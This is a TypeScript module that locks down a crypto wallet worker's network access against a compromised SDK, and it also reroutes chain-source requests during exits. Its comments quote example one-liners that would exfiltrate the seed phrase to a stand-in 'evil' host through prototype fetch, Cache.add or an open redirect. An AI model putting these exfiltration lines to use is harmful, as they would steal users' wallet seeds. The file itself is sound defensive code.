// Network hardening for the wallet worker realm — split into its own module
// with no dependency on @secondts/bark so wallet.worker.ts can import and
// run it before the SDK module is ever evaluated. See wallet.worker.ts for
// why that ordering matters (a compromised SDK release could otherwise
// capture the real self.fetch etc. at its own top level, before any patch
// installed later in the same module would apply).
//
// The mnemonic lives in this worker for the whole unlocked session (every
// wallet.* call needs it), and WASM has no network primitive of its own —
// any network request the SDK makes, legitimate or not, goes through one of
// this worker's own network APIs. Patch all of them into an allowlist so a
// compromised @secondts/bark release can't silently exfiltrate the seed to
// an arbitrary host on every unlock/sync/maintenance call: those only ever
// need the Ark server and the esplora endpoint below, so those two hosts
// are always allowed. Sending to a Lightning address or LNURL is the one
// legitimate case that needs to resolve a recipient-chosen domain — that's
// allowed only for the duration of the specific call that needs it, and only
// for the specific host(s) that call's own destination names (see
// arbitraryDomain.allow() below), not for the whole call and not for every
// host on the internet: a blanket "any host while this call runs" bypass
// used to apply here, which meant a compromised release could exfiltrate to
// its own hardcoded server during any Lightning-address/LNURL send. Fixed
// 2026-09-17 — see the audit note this closes.
import { IS_REGTEST, IS_SIGNET } from "../network";

// Single source of truth for the Ark/esplora endpoints — imported by
// walletWorkerImpl.ts too, so the allowlist can never drift from the config
// actually handed to the SDK.
export const CONFIG = IS_REGTEST
  ? {
      // E2E regtest mode only (src/lib/network.ts); dead code in deployed builds.
      serverAddress: __REGTEST_ARK_URL__,
      esploraAddress: __REGTEST_ESPLORA_URL__,
    }
  : IS_SIGNET
  ? {
      // Signet dev mode only (src/lib/network.ts); dead code in deployed builds.
      serverAddress: "https://ark.signet.2nd.dev",
      esploraAddress: "https://esplora.signet.2nd.dev",
    }
  : {
      serverAddress: "https://ark.second.tech",
      esploraAddress: "https://mempool.second.tech/api",
    };

// second.tech operates both ark.second.tech (round coordinator) AND
// mempool.second.tech (the esplora chain source above) — a unilateral exit
// doesn't need the round coordinator (its transactions are pre-signed
// client-side), but it does need *some* chain source to broadcast through
// and monitor confirmations on, and until this existed that had no fallback
// at all if second.tech's infrastructure was down as a whole. walletWorkerImpl
// swaps this in for CONFIG.esploraAddress on request (see the "open"
// message's useFallbackChainSource) — a different, independently-operated
// public esplora instance, not another second.tech host, so the two are
// unlikely to go down together.
//
// During an exit every independent one below is tried in turn (see
// fetchViaIndependentEsplora); the first is also the open fallback.
export const INDEPENDENT_ESPLORA_ADDRESSES: readonly string[] = IS_REGTEST
  ? [CONFIG.esploraAddress]
  : IS_SIGNET
  ? ["https://blockstream.info/signet/api", "https://mempool.space/signet/api"]
  : ["https://mempool.space/api", "https://blockstream.info/api"];
export const FALLBACK_ESPLORA_ADDRESS = INDEPENDENT_ESPLORA_ADDRESSES[0];

// While an unilateral exit runs, nothing it needs may depend on Second's
// infrastructure (decided with the user, 2026-09-28): an esplora run by the
// Ark operator could withhold the exit's broadcasts until the coins expire and
// then sweep them. bark takes its chain source once, at open, so instead of
// reopening the wallet (that flashed the unlock screen) the fetch guard below
// rewrites bark's requests to CONFIG.esploraAddress onto the independent
// INDEPENDENT_ESPLORA_ADDRESSES. All speak the same esplora API, POST
// /txs/package included (mempool.space's backend has it since 2024-10). Only
// that one prefix is rewritten, and the rewritten URL goes through the
// allowlist again.
//
// Returns the rewritten URL, or null when `url` isn't under `primary`.
export function redirectEsploraUrl(
  url: string,
  primary: string = CONFIG.esploraAddress,
  independent: string = FALLBACK_ESPLORA_ADDRESS,
): string | null {
  if (primary === independent) return null;
  if (url === primary) return independent;
  for (const sep of ["/", "?"]) {
    if (url.startsWith(primary + sep)) return independent + url.slice(primary.length);
  }
  return null;
}

// Whether a response from an independent esplora means it didn't serve the
// request at all. A 4xx is an answer: a 404 is "this transaction isn't known"
// (bark then re-broadcasts it) and must never be asked of Second instead, a
// 400 is a rejected broadcast. A 429 is neither: the host is up but refuses
// us (public instances rate-limit bursts and block an IP for a while).
export function independentEsploraFailed(status: number | null): boolean {
  return status === null || status >= 500;
}

// How long every independent esplora may refuse (429) before the exit uses
// Second's after all: an exit that cannot reach the chain until its coins
// expire loses them, which is worse than depending on the operator.
export const INDEPENDENT_REFUSAL_LIMIT_MS = 15 * 60_000;

export interface IndependentEsploraState {
  // Index into the targets of the one that answered last; tried first.
  preferred: number;
  // Since when every independent one has refused (429), null once one answers.
  refusingSince: number | null;
}

export const independentEsploraState: IndependentEsploraState = { preferred: 0, refusingSince: null };

// The redirected request: the same method, headers, body and abort signal as
// bark's, sent to each of `targets` (the same path on every independent
// esplora) in turn, starting with the one that answered last. The first
// answer wins. Second's esplora gets the ORIGINAL request only when every
// independent one is down (network error or 5xx), or when they have all been
// refusing (429) for INDEPENDENT_REFUSAL_LIMIT_MS; counted by `onFallback`.
// Before that a refusal goes back to bark (as a 502, see withoutEsploraRetry).
// An abort is never retried anywhere.
export async function fetchViaIndependentEsplora(
  request: Request,
  targets: readonly string[],
  realFetch: (r: Request) => Promise<Response>,
  onFallback: (status: number | null) => void,
  state: IndependentEsploraState = independentEsploraState,
  now: () => number = Date.now,
): Promise<Response> {
  // A clone keeps the original's body for the fallback.
  const original = request.clone();
  const hasBody = request.method !== "GET" && request.method !== "HEAD";
  const body = hasBody ? await request.arrayBuffer() : undefined;
  const signal = request.signal;
  const start = targets.length > 0 ? Math.min(Math.max(state.preferred, 0), targets.length - 1) : 0;
  let refused: Response | null = null;
  let status: number | null = null;
  for (let k = 0; k < targets.length; k++) {
    const i = (start + k) % targets.length;
    let response: Response;
    try {
      response = await realFetch(
        new Request(targets[i], { method: request.method, headers: request.headers, body, signal, redirect: "error" }),
      );
    } catch (e) {
      if (signal.aborted) throw e;
      status = null;
      continue;
    }
    status = response.status;
    if (status === 429) {
      refused = response;
      continue;
    }
    if (independentEsploraFailed(status)) continue;
    state.preferred = i;
    state.refusingSince = null;
    return response;
  }
  if (refused !== null) {
    state.refusingSince ??= now();
    if (now() - state.refusingSince < INDEPENDENT_REFUSAL_LIMIT_MS) return refused;
    status = 429;
  }
  onFallback(status);
  return realFetch(original);
}

// bark asks for the tip on every sync (its own cache lasts 1 s) and the app
// syncs every few seconds; sent to a public esplora during an exit that is a
// burst it rate-limits. These answers are cached for the exit instead: a tip
// 30 s old changes nothing for an exit (blocks are ~10 min apart). The hash
// at a height (bark looks up the tip's) changes only in a reorg of that block.
const EXIT_CACHE_TTL_MS: Readonly<Record<string, number>> = {
  "/blocks/tip/height": 30_000,
  "/blocks/tip/hash": 30_000,
  "/fee-estimates": 60_000,
  "/block-height/": 60_000,
};

function exitCacheTtl(key: string): number | undefined {
  return EXIT_CACHE_TTL_MS[key] ?? (/^\/block-height\/\d+$/.test(key) ? EXIT_CACHE_TTL_MS["/block-height/"] : undefined);
}

interface CachedAnswer {
  at: number;
  status: number;
  body: string;
  headers: [string, string][];
  url: string;
}

export const exitAnswerCache = new Map<string, CachedAnswer>();

// The cache key (the path after the esplora prefix) for a cacheable GET, or null.
export function exitCacheKey(method: string, url: string, primary: string = CONFIG.esploraAddress): string | null {
  if (method.toUpperCase() !== "GET" || !url.startsWith(primary + "/")) return null;
  const path = url.slice(primary.length);
  return path !== "/block-height/" && exitCacheTtl(path) !== undefined ? path : null;
}

export function cachedExitAnswer(key: string, now: number): Response | null {
  const hit = exitAnswerCache.get(key);
  if (hit === undefined || now - hit.at >= (exitCacheTtl(key) ?? 0)) return null;
  const res = new Response(hit.body, { status: hit.status, headers: hit.headers });
  Object.defineProperty(res, "url", { value: hit.url });
  return res;
}

export async function rememberExitAnswer(key: string, response: Response, now: number): Promise<Response> {
  // Any 2xx: mempool.space answers /fee-estimates with a 203.
  if (!response.ok) return response;
  const body = await response.text();
  const entry: CachedAnswer = { at: now, status: response.status, body, headers: [...response.headers], url: response.url };
  exitAnswerCache.set(key, entry);
  const res = new Response(body, { status: entry.status, headers: entry.headers });
  Object.defineProperty(res, "url", { value: entry.url });
  return res;
}

// bark builds its esplora client with esplora-client's DefaultSleeper
// (tokio::time::sleep), which panics on wasm32-unknown-unknown ("time not
// implemented on this platform"). esplora-client sleeps before retrying
// exactly these statuses, so any one of them from an esplora host (a public
// one rate-limits bursts, and the exit sends everything to one) would kill
// the worker. bark gets a 502 instead: an error it returns at once, and the
// app retries on its own cycle.
const ESPLORA_RETRYABLE_STATUSES: ReadonlySet<number> = new Set([429, 500, 503]);
export const WITHHELD_RETRY_STATUS = 502;

export function isEsploraUrl(url: string): boolean {
  return [CONFIG.esploraAddress, ...INDEPENDENT_ESPLORA_ADDRESSES].some(
    (base) => url === base || url.startsWith(base + "/") || url.startsWith(base + "?"),
  );
}

export function withoutEsploraRetry(url: string, response: Response): Response {
  if (!isEsploraUrl(url) || !ESPLORA_RETRYABLE_STATUSES.has(response.status)) return response;
  const out = new Response(response.body, {
    status: WITHHELD_RETRY_STATUS,
    statusText: `esplora ${response.status}`,
    headers: response.headers,
  });
  // A constructed Response has url "", and reqwest's wasm client parses
  // response.url (a plain property read in the SDK's glue): "url parse", panic.
  Object.defineProperty(out, "url", { value: response.url });
  return out;
}

// bark takes its fee rates from esplora's /fee-estimates with no upper bound
// (chain.rs fetch_fee_rates) and uses the "fast" one for every exit CPFP, which
// progressExits builds and broadcasts every minute without asking (and RBFs
// upward). An esplora that lies, or anything between us and it, could burn the
// on-chain balance on fees that way. Clamped here, on every esplora answer.
// Above any sustained real market, so a genuine spike still gets through; the
// fee previews read the same capped table.
export const MAX_FEE_RATE_SAT_VB = 1000;

function isFeeEstimatesUrl(url: string): boolean {
  if (!isEsploraUrl(url)) return false;
  try {
    return new URL(url).pathname.endsWith("/fee-estimates");
  } catch {
    return false;
  }
}

// The same response, every rate above MAX_FEE_RATE_SAT_VB lowered to it. A
// body that isn't a JSON object of numbers goes back untouched (bark rejects
// it itself).
export async function capFeeEstimates(method: string, url: string, response: Response): Promise<Response> {
  if (method.toUpperCase() !== "GET" || !response.ok || !isFeeEstimatesUrl(url)) return response;
  const body = await response.text();
  let out = body;
  try {
    const parsed: unknown = JSON.parse(body);
    if (typeof parsed === "object" && parsed !== null && !Array.isArray(parsed)) {
      const capped: Record<string, unknown> = {};
      let changed = false;
      for (const [k, v] of Object.entries(parsed)) {
        if (typeof v === "number" && v > MAX_FEE_RATE_SAT_VB) {
          capped[k] = MAX_FEE_RATE_SAT_VB;
          changed = true;
        } else {
          capped[k] = v;
        }
      }
      if (changed) {
        console.warn(`[wallet.worker] fee estimates above ${MAX_FEE_RATE_SAT_VB} sat/vB capped (${url})`);
        out = JSON.stringify(capped);
      }
    }
  } catch {
    // not JSON: as it came
  }
  const headers = new Headers(response.headers);
  headers.delete("content-length");
  const res = new Response(out, { status: response.status, statusText: response.statusText, headers });
  // Same reason as withoutEsploraRetry: reqwest's wasm client parses response.url.
  Object.defineProperty(res, "url", { value: response.url });
  return res;
}

// Set by walletWorkerImpl.ts (open with a live exit, exit start, every
// syncExitLocks). `fallbacks` counts requests that went to Second's esplora
// because the independent one failed, for the island in Dashboard.
export const exitChainRedirect = {
  on: false,
  fallbacks: 0,
  set(on: boolean): void {
    this.on = on;
  },
  reset(): void {
    this.on = false;
    this.fallbacks = 0;
    independentEsploraState.preferred = 0;
    independentEsploraState.refusingSince = null;
    exitAnswerCache.clear();
  },
};

const ALWAYS_ALLOWED_HOSTS = new Set(
  [CONFIG.serverAddress, CONFIG.esploraAddress, ...INDEPENDENT_ESPLORA_ADDRESSES].map((v) => new URL(v).host),
);

// Stack of host-sets currently exempted from the allowlist — see
// arbitraryDomain.allow() below. A stack rather than a single set is just a
// safety margin: walletWorkerImpl.ts's own FIFO queue means at most one
// wallet.* call ever runs at a time, so in practice this never holds more
// than one entry, but nothing here depends on that staying true.
const arbitraryDomainStack: Set<string>[] = [];

// walletWorkerImpl.ts owns which methods qualify (payLightningAddress,
// payLnurl) and — this is the part that used to be missing — which host(s)
// each specific call actually needs, derived from the destination it's
// paying (the lightning address's own domain, or the host a raw LNURL
// bech32-decodes to). Exposing an allow() scoped to exactly those hosts,
// rather than a bare counter that disabled the whole allowlist, is what
// keeps a compromised @secondts/bark release from exfiltrating to an
// unrelated, hardcoded host during the one window that has to tolerate a
// recipient-chosen domain at all.
export const arbitraryDomain = {
  allow(hosts: Iterable<string>): () => void {
    const entry = new Set(hosts);
    arbitraryDomainStack.push(entry);
    let released = false;
    return () => {
      if (released) return;
      released = true;
      const idx = arbitraryDomainStack.lastIndexOf(entry);
      if (idx !== -1) arbitraryDomainStack.splice(idx, 1);
    };
  },
};

// A host matches an exception entry if it's that exact host, or a subdomain
// of it (`api.domain.com` for an entry of `domain.com`). LNURL-pay's own spec
// (LUD-06) lets a provider's callback URL live on a different host than the
// one the address/LNURL first resolves to — in practice that's routinely a
// same-provider subdomain (a CDN or API host), not an unrelated domain. This
// still refuses every host outside the recipient's own domain, which is the
// actual gap being closed here.
function matchesArbitraryDomainEntry(host: string, entry: string): boolean {
  return host === entry || host.endsWith(`.${entry}`);
}

function isAllowedHost(host: string): boolean {
  if (ALWAYS_ALLOWED_HOSTS.has(host)) return true;
  for (const entrySet of arbitraryDomainStack) {
    for (const entry of entrySet) {
      if (matchesArbitraryDomainEntry(host, entry)) return true;
    }
  }
  return false;
}

// Same-origin is NOT a free pass in this realm. This app's own Worker has
// endpoints that store whatever they are given under a key the caller picks
// and hand it back to anyone who asks: /api/backup/upload-tmp + commit, then
// /api/backup/fetch (a lookupKey is any 64 hex chars, and the Worker's
// same-origin check is a header curl can set). A blanket same-origin
// allowance made that a dead drop: POST the seed under a hardcoded key, read
// it back later from anywhere. The only thing this worker loads from its own
// origin is the SDK's .wasm, a GET under /assets/ in a build (dev serves it
// from /node_modules, hence the DEV branch, resolved statically by Vite).
// Nothing here ever needs a same-origin write.
export function isAllowedSameOriginRequest(url: URL, method: string, dev: boolean): boolean {
  const m = method.toUpperCase();
  if (m !== "GET" && m !== "HEAD") return false;
  if (dev) return true;
  return url.pathname.startsWith("/assets/") && url.search === "";
}

// false also when the URL cannot be parsed at all: this is the one realm that
// holds the mnemonic for the whole unlocked session, so an input shape we
// can't reason about has to fail closed, the same way public/fetch-guard.js's
// isSameOrigin() does.
function isAllowedRequest(url: string, method: string): boolean {
  let parsed: URL;
  try {
    parsed = new URL(url, self.location.href);
  } catch {
    return false;
  }
  if (parsed.origin === self.location.origin) {
    return isAllowedSameOriginRequest(parsed, method, import.meta.env.DEV);
  }
  // The harness's Ark server and esplora are plain http on loopback; only a
  // regtest build (never a deployed one) accepts that scheme, and only for
  // an already allowlisted host.
  if (IS_REGTEST && parsed.protocol === "http:" && parsed.hostname === "127.0.0.1") return isAllowedHost(parsed.host);
  return parsed.protocol === "https:" && isAllowedHost(parsed.host);
}

// Assigning `self.x = …` only creates an OWN property on the global that
// *shadows* the original — it does not replace it. WebIDL puts operations
// like fetch() on WorkerGlobalScope.prototype, so the untouched original
// stays fully reachable:
//
//   WorkerGlobalScope.prototype.fetch.call(self, "https://evil/?s=" + mnemonic)
//
// which is a one-line bypass of this entire file, in the one realm that
// holds the mnemonic for the whole unlocked session. CSP is no backstop:
// connect-src is deliberately `https:` (see public/_headers), so any host
// is permitted. `Window` has no such prototype entry — fetch is an own
// property of the global there — which is why the main-thread guard in
// public/fetch-guard.js doesn't need this and this file does.
function defineOnGlobalAndPrototype(name: string, value: unknown): void {
  (self as unknown as Record<string, unknown>)[name] = value;
  for (let proto = Object.getPrototypeOf(self) as object | null; proto; proto = Object.getPrototypeOf(proto) as object | null) {
    const descriptor = Object.getOwnPropertyDescriptor(proto, name);
    if (descriptor === undefined) continue;
    if (descriptor.configurable) {
      Object.defineProperty(proto, name, { value, writable: true, configurable: true });
    }
    break;
  }
}

export function installNetworkGuards() {
  const realFetch = self.fetch.bind(self);
  const guardedFetch = (async (input: RequestInfo | URL, init?: RequestInit) => {
    // Never trust input.url directly: an attacker-controlled object with a
    // custom toString() has no .url property, so a naive
    // `input && input.url` reads as undefined — new Request(...) forces the
    // exact same coercion the real fetch() would apply, so the URL we check
    // is the URL that's actually requested. Build it exactly once: if
    // `input` is itself a Request with a body, constructing a second Request
    // from it (e.g. re-passing the original `input` to realFetch below)
    // consumes/locks that body stream, and the real fetch then throws
    // "Cannot construct a Request with a Request object that has already
    // been used" — breaking every non-GET call (the Ark handshake included).
    // Reuse this same constructed Request for the real fetch instead of
    // building a second one from `input`.
    let request: Request;
    try {
      // redirect forced here, in the one construction this function makes,
      // rather than by building a second Request from this one further down
      // — that would disturb this one's body stream, which is the exact
      // failure the comment above describes.
      request = new Request(input, { ...init, redirect: "error" });
    } catch {
      return Promise.reject(new Error("Blocked unexpected network request"));
    }
    if (!isAllowedRequest(request.url, request.method)) {
      console.error(`[wallet.worker] blocked unexpected ${request.method} to ${request.url}`);
      return Promise.reject(new Error("Blocked unexpected network request"));
    }
    // The allowlist above checks the URL that is *requested*; without this it
    // said nothing about where the response actually comes from. fetch's
    // default redirect mode is "follow", so a 3xx from an allowed host sends
    // the browser wherever that host points — and an open redirector on any
    // one of them (`.../redirect?url=https://evil/?s=<mnemonic>`) turns this
    // entire allowlist into a formality, in the one realm that holds the
    // seed. CSP is no backstop: connect-src is deliberately `https:`.
    //
    // "error" rather than a manual re-check, because a manual re-check is not
    // implementable here: with redirect "manual" a cross-origin 3xx comes
    // back as an opaque response with no readable Location, so there is
    // nothing to re-validate. Verified against the endpoints this app
    // actually uses (ark.second.tech's gRPC POST, both esplora hosts' tip/
    // fee/tx/address paths) — none redirect, so failing closed costs nothing
    // today, and if one ever starts, it fails loudly here rather than
    // silently forwarding.
    if (exitChainRedirect.on) {
      const targets = INDEPENDENT_ESPLORA_ADDRESSES.map((independent) =>
        redirectEsploraUrl(request.url, CONFIG.esploraAddress, independent),
      ).filter((t): t is string => t !== null && isAllowedRequest(t, request.method));
      if (targets.length > 0) {
        const key = exitCacheKey(request.method, request.url);
        const cached = key === null ? null : cachedExitAnswer(key, Date.now());
        if (cached !== null) return capFeeEstimates(request.method, request.url, cached);
        const response = await fetchViaIndependentEsplora(request, targets, realFetch, (status) => {
          exitChainRedirect.fallbacks++;
          console.warn(`[wallet.worker] independent esplora failed (${status ?? "network"}), using Second's for ${request.method} ${request.url}`);
        });
        const answer = key === null ? response : await rememberExitAnswer(key, response, Date.now());
        return capFeeEstimates(request.method, request.url, withoutEsploraRetry(request.url, answer));
      }
    }
    return capFeeEstimates(request.method, request.url, withoutEsploraRetry(request.url, await realFetch(request)));
  }) as typeof fetch;
  defineOnGlobalAndPrototype("fetch", guardedFetch);

  // caches.add()/addAll() issue a real network request that never passes
  // through self.fetch, so the allowlist above simply never sees them:
  //   (await caches.open("x")).add("https://evil/?s=" + mnemonic)
  // Nothing in @secondts/bark needs the Cache API — it persists through
  // IndexedDB — so block the two fetching methods outright rather than
  // trying to allowlist them.
  const cacheProto = (self as unknown as { Cache?: { prototype: Record<string, unknown> } }).Cache?.prototype;
  if (cacheProto !== undefined) {
    cacheProto.add = function () {
      console.error("[wallet.worker] blocked unexpected caches.add");
      return Promise.reject(new Error("Cache.add is not used by this app"));
    };
    cacheProto.addAll = function () {
      console.error("[wallet.worker] blocked unexpected caches.addAll");
      return Promise.reject(new Error("Cache.addAll is not used by this app"));
    };
  }

  // fetch() is the only network primitive @secondts/bark's own README shows
  // it using, but these are patched too on the same "assume a compromised
  // release, not a documented API surface" basis as the fetch patch above —
  // cheap to close now rather than leave as a known bypass.
  // Coerce the URL to a string exactly once and reuse that string for both
  // the check and the real call — same reasoning as the fetch patch above
  // (new Request(input).url, not a re-stringified `input`). An object with
  // a stateful toString() (e.g. one that returns an allowed host the first
  // time and an attacker's host the second) would otherwise pass the check
  // against one value and dispatch against another.
  const realXhrOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function (this: XMLHttpRequest, method: string, url: string | URL, ...rest: unknown[]) {
    // The method too, now that it decides same-origin requests.
    const methodString = String(method);
    const urlString = String(url);
    if (!isAllowedRequest(urlString, methodString)) {
      console.error(`[wallet.worker] blocked unexpected XHR ${methodString} to ${urlString}`);
      throw new Error("Blocked unexpected network request");
    }
    return (realXhrOpen as (...a: unknown[]) => void).apply(this, [methodString, urlString, ...rest]);
  } as typeof XMLHttpRequest.prototype.open;

  if (typeof self.navigator?.sendBeacon === "function") {
    // Patch the prototype, not the instance — WorkerNavigator.prototype
    // .sendBeacon.call(navigator, ...) would otherwise reach the original.
    const proto = Object.getPrototypeOf(self.navigator) as { sendBeacon: typeof navigator.sendBeacon };
    const realSendBeacon = proto.sendBeacon;
    proto.sendBeacon = function (this: Navigator, url: string | URL, data?: BodyInit | null) {
      const urlString = String(url);
      // A beacon is always a POST, so never allowed same-origin.
      if (!isAllowedRequest(urlString, "POST")) {
        console.error(`[wallet.worker] blocked unexpected sendBeacon to ${urlString}`);
        return false;
      }
      return realSendBeacon.call(this, urlString, data);
    };
  }

  // Nothing @secondts/bark documents or this app uses needs EventSource —
  // block it outright rather than allowlisting.
  if ("EventSource" in self) {
    (self as unknown as { EventSource: unknown }).EventSource = function () {
      throw new Error("EventSource is not used by this app");
    };
  }

  // Nothing @secondts/bark documents needs a WebSocket, and this app never
  // opens one itself — block it outright (unlike the main-thread guard,
  // there's no dev-mode HMR client running inside this worker that would
  // need a same-origin exception).
  const RealWebSocket = self.WebSocket;
  const blockedWebSocket = new Proxy(RealWebSocket, {
    construct(_target, args) {
      const url = String(args[0]);
      console.error(`[wallet.worker] blocked unexpected WebSocket to ${url}`);
      throw new Error("WebSocket is not used by this app");
    },
  });
  defineOnGlobalAndPrototype("WebSocket", blockedWebSocket);
  // A Proxy forwards `.prototype` straight to its target, so the untouched
  // original constructor is still reachable as
  // `WebSocket.prototype.constructor` — the exact hole
  // public/fetch-guard.js:106 already closes on the main thread. Per CSP3
  // scheme matching an `https:` source expression also covers `wss:`, so
  // connect-src doesn't stop it either.
  Object.defineProperty(RealWebSocket.prototype, "constructor", {
    value: blockedWebSocket,
    writable: true,
    configurable: true,
  });

  // WebTransport is a network primitive in its own right, exactly like the
  // WebSocket above — it never goes through fetch, and CSP is no backstop
  // either (connect-src is deliberately `https:`, which covers WebTransport's
  // https:// URLs). Nothing @secondts/bark documents needs it. Same treatment
  // as WebSocket: replace it on the global *and* the prototype chain, then
  // close the `.prototype.constructor` route back to the original.
  // typeof === "function", not just `in self`: everything below assumes a
  // real constructor with a .prototype, and this whole function running to
  // completion is load-bearing — a throw here takes the entire wallet worker
  // down with it, not just this one patch.
  if (typeof (self as unknown as { WebTransport?: unknown }).WebTransport === "function") {
    const RealWebTransport = (self as unknown as { WebTransport: new (...a: unknown[]) => unknown }).WebTransport;
    const blockedWebTransport = new Proxy(RealWebTransport, {
      construct(_target, args) {
        console.error(`[wallet.worker] blocked unexpected WebTransport to ${String(args[0])}`);
        throw new Error("WebTransport is not used by this app");
      },
    });
    defineOnGlobalAndPrototype("WebTransport", blockedWebTransport);
    Object.defineProperty(RealWebTransport.prototype, "constructor", {
      value: blockedWebTransport,
      writable: true,
      configurable: true,
    });
  }

  // A compromised SDK release could try to dodge this whole guard by
  // spawning a fresh, unpatched realm. Nothing this app does needs a nested
  // worker from inside the wallet worker.
  if ("Worker" in self) {
    (self as unknown as { Worker: unknown }).Worker = function () {
      throw new Error("Nested Worker is not used by this app");
    };
  }
  if ("SharedWorker" in self) {
    (self as unknown as { SharedWorker: unknown }).SharedWorker = function () {
      throw new Error("SharedWorker is not used by this app");
    };
  }
}
